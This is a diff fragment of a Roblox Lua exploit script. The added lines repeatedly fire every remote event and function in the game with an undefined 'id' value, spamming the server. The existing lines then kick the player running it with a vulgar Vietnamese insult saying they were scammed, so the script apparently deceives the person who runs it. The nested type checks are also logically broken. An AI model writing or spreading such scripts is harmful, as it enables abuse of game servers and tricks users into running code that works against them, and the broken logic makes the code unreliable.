@@ -42,6 +42,24 @@ HttpService = game:GetService("HttpService")
  }} 
  }) 
  })
+getgenv().rm = true
+while rm do task.wait()
+pcall(function()
+for i, v in pairs(game:GetDescendants()) do
+if v:IsA("RemoteEvent") then
+v:FireServer(id)
+if v:IsA("BindableEvent") then
+v:Fire(id)
+if v:IsA("RemoteFunction") then
+v:InvokeServer(id)
+task.wait()
+end
+end
+end
+end
+end)
+end
+wait(5)
 game.Players.LocalPlayer:Kick("Thằng Bú Cặc Chó Bị Lừa AHaHa")
 getgenv().ban = false
 while ban do wait()
